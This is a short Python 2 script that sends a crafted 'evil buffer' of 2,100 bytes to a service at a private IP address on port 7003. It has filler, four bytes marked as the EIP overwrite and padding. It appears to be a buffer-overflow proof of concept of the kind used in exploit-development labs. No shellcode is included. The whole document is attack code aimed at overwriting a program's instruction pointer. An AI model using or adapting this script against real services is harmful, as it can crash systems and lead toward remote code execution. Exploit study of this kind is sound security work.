#!/usr/bin/python
import socket

try:
  print "\nSending evil buffer..."

  filler = "B" * 2080
  eip = "Y" * 4
  buffer = "Z" * (2100 - len(filler) - len(eip))
  inputBuffer = filler + eip + buffer

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
